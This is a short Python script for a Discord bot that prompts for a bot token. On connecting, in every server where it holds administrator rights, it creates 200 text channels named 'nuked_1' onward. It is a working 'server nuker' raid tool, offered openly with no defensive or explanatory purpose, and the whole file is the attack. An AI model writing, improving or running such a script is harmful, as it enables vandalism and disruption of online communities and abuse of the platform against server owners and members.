import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

    for guild in bot.guilds:
        if guild.me.guild_permissions.administrator:
            for i in range(200):
                await guild.create_text_channel(f'nuked_{i + 1}')
            print(f'Created 200 channels in {guild.name}.')

def get_bot_token():
    try:
        token = input("Enter your Discord bot token: ")
        return token.strip()
    except KeyboardInterrupt:
        print("\nBot token input canceled.")
        exit(1)

bot_token = get_bot_token()
bot.run(bot_token)
